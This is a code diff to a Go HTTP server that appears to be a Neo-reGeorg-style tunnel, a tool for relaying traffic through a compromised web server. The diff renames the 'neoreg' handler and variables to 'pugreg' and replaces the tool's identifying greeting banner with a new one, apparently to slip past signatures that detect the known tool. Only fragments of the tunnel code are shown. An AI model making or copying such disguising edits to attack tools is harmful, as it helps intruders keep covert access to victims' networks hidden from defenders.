@@ -1,3 +1,4 @@
+// Build: linhjaps
 package main
 
 import (
@@ -32,7 +33,7 @@ var (
     en_map = make(map[byte]byte)
     de_map = make(map[byte]byte)
 
-    neoreg_hello = []byte("NeoGeorg says, 'All seems fine'")
+    pugreg_hello = []byte("PugGeorg says, 'Endpoint ready'")
 
     sessions = make(map[string]*session)
 
@@ -177,7 +178,7 @@ func (sess *session) Close() {
     sess.closed = true
 }
 
-func neoreg(w http.ResponseWriter, r *http.Request) {
+func pugreg(w http.ResponseWriter, r *http.Request) {
     w.WriteHeader(HTTPCODE)
 
     defer r.Body.Close()
@@ -250,7 +251,7 @@ func neoreg(w http.ResponseWriter, r *http.Request) {
             }
 
         default:
-            hello, _ := base64decode(neoreg_hello)
+            hello, _ := base64decode(pugreg_hello)
             fmt.Fprintf(w, "%s", hello)
             return
         }
@@ -258,7 +259,7 @@ func neoreg(w http.ResponseWriter, r *http.Request) {
         data := blv_encode(rinfo)
         fmt.Fprintf(w, "%s", base64encode(data))
     } else {
-        hello, _ := base64decode(neoreg_hello)
+        hello, _ := base64decode(pugreg_hello)
         fmt.Fprintf(w, "%s", hello)
     }
 
@@ -275,6 +276,6 @@ func main() {
     if !strings.ContainsAny(listen_addr, ":") {
         listen_addr = ":" + listen_addr
     }
-    http.HandleFunc("/", neoreg)
+    http.HandleFunc("/", pugreg)
     http.ListenAndServe(listen_addr, nil)
 }
